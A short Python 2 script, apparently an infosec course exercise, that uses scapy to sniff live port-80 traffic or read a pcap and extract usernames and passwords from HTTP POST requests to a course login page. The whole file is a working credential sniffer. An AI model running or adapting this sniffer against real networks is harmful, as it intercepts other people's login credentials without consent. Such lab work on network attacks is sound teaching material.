import scapy.all as S
import urlparse


WEBSITE = 'infosec.cs.tau.ac.il'


def parse_packet(packet):
    try:
        if "Raw" in packet:
            found = r"POST /2019/login/ HTTP/1.1\r\nHost: %s" %WEBSITE
            if found in repr(packet[S.Raw].load):
                if "username" in packet[S.Raw].load and "password" in packet[S.Raw].load:
                    dictionary = urlparse.parse_qs(packet[S.Raw].load)
                    password = dictionary["password"][0]
                    username = dictionary["username"][0]
                    return (username, password)
        return None
    except: # should not occur - just for safety (maybe no load in raw etc)
        return None

        


def packet_filter(packet):
    try:
        if packet:
            return True if packet.dport == 80 else False
        else:
            return False
    except AttributeError: # should not occur - just for safety.
        return False


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
